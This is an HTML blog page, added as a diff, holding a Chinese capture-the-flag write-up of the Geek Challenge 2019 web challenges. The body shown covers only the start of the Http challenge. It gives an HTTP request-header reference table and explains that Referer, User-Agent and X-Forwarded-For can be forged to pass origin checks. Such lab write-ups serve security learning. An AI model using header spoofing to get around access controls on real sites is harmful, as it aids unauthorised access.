@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="0x01前言听说极客大挑战的题目挺好的，刚好ctfshow做累了，就去一个个复现去做题积累经验 0x02赛题[极客大挑战 2019]Http打开题目  搜罗一圈之后没看到什么，Ctrl+u看一下源代码，然后在里面发现了一个Secret.php，访问看看  意思是我们不是来自https:&#x2F;&#x2F;Sycsecret.buuoj.cn的访问，一看就知道是请求头信息伪造了 知识点:请求头大全Header">
+<meta property="og:type" content="article">
+<meta property="og:title" content="极客大挑战2019wp--web(已做完)">
+<meta property="og:url" content="https://wanth3f1ag.top/2024/11/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019wp--web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:description" content="0x01前言听说极客大挑战的题目挺好的，刚好ctfshow做累了，就去一个个复现去做题积累经验 0x02赛题[极客大挑战 2019]Http打开题目  搜罗一圈之后没看到什么，Ctrl+u看一下源代码，然后在里面发现了一个Secret.php，访问看看  意思是我们不是来自https:&#x2F;&#x2F;Sycsecret.buuoj.cn的访问，一看就知道是请求头信息伪造了 知识点:请求头大全Header">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111144846929.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111145020815-1731307826332-2.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111145609789-1731308171053-4.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111150156390-1731308518660-6.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111150217001-1731308538274-8.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111150322118-1731308603740-10-1731308605708-12-1731308607620-14-1731308609277-16.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111150708988-1731308832350-1.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111150853118-1731308934392-3.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111151654323-1731309415345-5.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111154133618-1731310894787-7.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111154205265-1731310926448-9.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20241111154338754-1731311019919-11.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250121004804689.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111155420887-1731311661949-13-1742810078858-63.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111190347533-1731323029026-47.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250121124832767.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20250121011804340.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111173046086-1731317448508-15.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111173758449-1731317879848-19.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111175056679-1731318658497-21.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111175119374-1731318681097-23.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111175201233-1731318722812-25.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111175315956-1731318797510-27.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111175355811-1731318837374-29.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111180542885-1731319544378-31.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111181358741-1731320040380-33.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111181515797-1731320116909-35.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111183058737-1731321059960-37.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111183232544-1731321153685-39.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111185030775-1731322231946-41.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111185201905-1731322322914-43.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111185556170-1731322557379-45.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111193758763-1731325079995-49.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111193841804-1731325122814-51.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111194130278-1731325291368-53.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111194400685.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20241111204701806-1731329222948-55.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250121173054824.png">
+<meta property="article:published_time" content="2024-11-11T06:43:57.000Z">
+<meta property="article:modified_time" content="2025-05-15T08:11:30.188Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="极客大挑战2019">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111144846929.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>极客大挑战2019wp--web(已做完)</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">H0me</a></li><!--
+     --><!--
+       --><li><a href="/about/">A6out</a></li><!--
+     --><!--
+       --><li><a href="/tags/">T6gs</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Catagory</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">s4arch</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/11/12/GXYCTF(%E5%B7%B2%E5%81%9A%E5%AE%8C)/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/11/10/web%E5%85%A5%E9%97%A8php%E7%AF%87-ctfshow(%E5%B7%B2%E5%81%9A%E5%AE%8C)/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2024/11/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019wp--web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2024/11/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019wp--web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&text=极客大挑战2019wp--web(已做完)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2024/11/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019wp--web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=极客大挑战2019wp--web(已做完)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2024/11/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019wp--web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&is_video=false&description=极客大挑战2019wp--web(已做完)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=极客大挑战2019wp--web(已做完)&body=Check out this article: https://wanth3f1ag.top/2024/11/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019wp--web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2024/11/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019wp--web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=极客大挑战2019wp--web(已做完)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2024/11/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019wp--web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=极客大挑战2019wp--web(已做完)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2024/11/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019wp--web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=极客大挑战2019wp--web(已做完)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2024/11/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019wp--web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=极客大挑战2019wp--web(已做完)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2024/11/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019wp--web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&name=极客大挑战2019wp--web(已做完)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2024/11/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019wp--web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&t=极客大挑战2019wp--web(已做完)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02%E8%B5%9B%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">0x02赛题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http"><span class="toc-number">2.1.</span> <span class="toc-text">[极客大挑战 2019]Http</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%A4%A7%E5%85%A8"><span class="toc-number">2.1.1.</span> <span class="toc-text">知识点:请求头大全</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-Referer%E4%BC%AA%E9%80%A0%E8%AF%B7%E6%B1%82%E6%9D%A5%E6%BA%90%E7%BD%91%E9%A1%B5"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">1.Referer伪造请求来源网页</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-User-Agent%E4%BC%AA%E9%80%A0%E8%AF%B7%E6%B1%82%E7%94%A8%E6%88%B7"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">2.User-Agent伪造请求用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-X-Forwarded-For%E5%86%85%E7%BD%91%E4%BC%AA%E8%A3%85"><span class="toc-number">2.1.1.3.</span> <span class="toc-text">3.X-Forwarded-For内网伪装</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP"><span class="toc-number">2.2.</span> <span class="toc-text">[极客大挑战 2019]PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.2.1.</span> <span class="toc-text">网站备份文件漏洞:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#construct-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">2.2.2.</span> <span class="toc-text">__construct()魔术方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wake-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">2.2.3.</span> <span class="toc-text">__wake()魔术方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#destruct-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">2.2.4.</span> <span class="toc-text">__destruct()魔术方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87wakeup%E6%96%B9%E6%B3%95%E5%85%B6%E4%B8%80"><span class="toc-number">2.2.5.</span> <span class="toc-text">绕过wakeup方法其一</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="toc-number">2.3.</span> <span class="toc-text">[极客大挑战 2019]EasySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL"><span class="toc-number">2.4.</span> <span class="toc-text">[极客大挑战 2019]LoveSQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL"><span class="toc-number">2.5.</span> <span class="toc-text">[极客大挑战 2019]BabySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL"><span class="toc-number">2.6.</span> <span class="toc-text">[极客大挑战 2019]HardSQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-FinalSQL"><span class="toc-number">2.7.</span> <span class="toc-text">[极客大挑战 2019]FinalSQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun"><span class="toc-number">2.8.</span> <span class="toc-text">[极客大挑战 2019]Havefun</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File"><span class="toc-number">2.9.</span> <span class="toc-text">[极客大挑战 2019]Secret File</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife"><span class="toc-number">2.10.</span> <span class="toc-text">[极客大挑战 2019]Knife</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload"><span class="toc-number">2.11.</span> <span class="toc-text">[极客大挑战 2019]Upload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GIF89a%E4%BC%AA%E9%80%A0jpg%E6%A0%BC%E5%BC%8F%E6%96%87%E4%BB%B6"><span class="toc-number">2.11.1.</span> <span class="toc-text">GIF89a伪造jpg格式文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag"><span class="toc-number">2.12.</span> <span class="toc-text">[极客大挑战 2019]BuyFlag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME"><span class="toc-number">2.13.</span> <span class="toc-text">[极客大挑战 2019]RCE ME</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        极客大挑战2019wp--web(已做完)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wanTh3flag</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-11-11T06:43:57.000Z" class="dt-published" itemprop="datePublished">2024-11-11</time>
+        
+        (Updated: <time datetime="2025-05-15T08:11:30.188Z" class="dt-updated" itemprop="dateModified">2025-05-15</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E8%B5%9B%E9%A2%98wp/">赛题wp</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/" rel="tag">极客大挑战2019</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h1><p>听说极客大挑战的题目挺好的，刚好ctfshow做累了，就去一个个复现去做题积累经验</p>
+<h1 id="0x02赛题"><a href="#0x02赛题" class="headerlink" title="0x02赛题"></a>0x02赛题</h1><h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>打开题目</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111144846929.png" alt="image-20241111144846929"></p>
+<p>搜罗一圈之后没看到什么，Ctrl+u看一下源代码，然后在里面发现了一个Secret.php，访问看看</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111145020815-1731307826332-2.png" alt="image-20241111145020815"></p>
+<p>意思是我们不是来自<a target="_blank" rel="noopener" href="https://sycsecret.buuoj.cn的访问,一看就知道是请求头信息伪造了/">https://Sycsecret.buuoj.cn的访问，一看就知道是请求头信息伪造了</a></p>
+<h3 id="知识点-请求头大全"><a href="#知识点-请求头大全" class="headerlink" title="知识点:请求头大全"></a>知识点:请求头大全</h3><p>Header			解释							示例</p>
+<p>Accept			指定客户端可以接收的内容类型	Accept:application&#x2F;json, text&#x2F;plain, <strong>&#x2F;</strong></p>
+<p>Accept-Charset	浏览器能够接受的字符编码集。	Accept-Charset: iso-8859-5</p>
+<p>Accept-Encoding	指定浏览器能够支持的web服务器返回内容压缩编码类型。	Accept-Encoding: gzip, deflate, br</p>
+<p>Accept-Language	浏览器可接受的语言			Accept-Language: zh-CN,zh;q&#x3D;0.9</p>
+<p>Accept-Ranges	能够请求网页实体的一个或者多个子范围字段	Accept-Ranges: bytes</p>
+<p>Authorization		HTTP受权的受权证书			Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ&#x3D;&#x3D;</p>
+<p>Cache-Control		指定请求和响应遵循的缓存机制	Cache-Control: max-age&#x3D;0</p>
+<p>Connection		表示是否须要持久链接。（HTTP 1.1默认进行持久链接）	Connection: keep-alive</p>
+<p>Cookie			HTTP请求发送时，会把保存在该请求域名下的全部cookie值一块儿发送给web服务器。	Cookie: OUTFOX_SEARCH_USER_ID&#x3D;<a href="mailto:&#x32;&#56;&#48;&#51;&#57;&#x32;&#50;&#x30;&#x37;&#x40;&#x31;&#48;&#46;&#x31;&#49;&#x30;&#46;&#57;&#54;&#x2e;&#x31;&#53;&#x38;">&#x32;&#56;&#48;&#51;&#57;&#x32;&#50;&#x30;&#x37;&#x40;&#x31;&#48;&#46;&#x31;&#49;&#x30;&#46;&#57;&#54;&#x2e;&#x31;&#53;&#x38;</a></p>
+<p>Content-Length	请求的内容长度	Content-Length: 348</p>
+<p>Content-Type		请求的与实体对应的MIME信息		Content-Type: application&#x2F;json;charset&#x3D;UTF-8</p>
+<p>Date			请求发送的日期和时间				Date: Tue, 15 Nov 2010 08:12:31 GMT</p>
+<p>Expect			请求的特定的服务器行为			Expect: 100-continue</p>
+<p><strong>From			发出请求的用户的Email				From: <a href="mailto:&#117;&#x73;&#x65;&#x72;&#64;&#x65;&#109;&#x61;&#x69;&#108;&#x2e;&#x63;&#x6f;&#109;">&#117;&#x73;&#x65;&#x72;&#64;&#x65;&#109;&#x61;&#x69;&#108;&#x2e;&#x63;&#x6f;&#109;</a></strong></p>
+<p>Host				指定请求的服务器的域名和端口号	Host: <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a></p>
+<p>If-Match			只有请求内容与实体相匹配才有效		If-Match: “737060cd8c284d8af7ad3082f209582d”</p>
+<p>If-Modified-Since	若是请求的部分在指定时间以后被修改则请求成功，未被修改则返回304代码	If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT</p>
+<p>If-None-Match		若是内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变	If-None-Match: “737060cd8c284d8af7ad3082f209582d”</p>
+<p>If-Range			若是实体未改变，服务器发送客户端丢失的部分，不然发送整个实体。参数也为Etag	If-Range: “737060cd8c284d8af7ad3082f209582d”</p>
+<p>If-Unmodified-Since	只在实体在指定时间以后未被修改才请求成功	If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT</p>
+<p>Max-Forwards			限制信息经过代理和网关传送的时间		Max-Forwards: 10</p>
+<p>Pragma				用来包含实现特定的指令				Pragma: no-cache</p>
+<p>Proxy-Authorization		链接到代理的受权证书						Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ&#x3D;&#x3D;</p>
+<p>Range				只请求实体的一部分，指定范围						Range: bytes&#x3D;500-999</p>
+<p><strong>Referer				先前网页的地址，当前请求网页紧随其后,即来路			Referer: <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a></strong></p>
+<p>TE					客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息	TE: trailers,deflate;q&#x3D;0.5</p>
+<p>Upgrade				向服务器指定某种传输协议以便服务器进行转换（若是支持）	Upgrade: HTTP&#x2F;2.0, SHTTP&#x2F;1.3, IRC&#x2F;6.9, RTA&#x2F;x11</p>
+<p><strong>User-Agent			User-Agent的内容包含发出请求的用户信息				User-Agent: Mozilla&#x2F;5.0 (Linux; X11)</strong></p>
+<p><strong>Via					通知中间网关或代理服务器地址，通讯协议						Via: 1.0 fred, 1.1 nowhere.com (Apache&#x2F;1.1)</strong></p>
+<p>Warning				关于消息实体的警告信息								Warn: 199 Miscellaneous warning</p>
+<p><strong>X-Forwarded-For		用来说明从哪里来的，一般用来内网伪装			X-Forwarded-For: 127.0.0.1</strong></p>
+<p>那就用bp抓包看看</p>
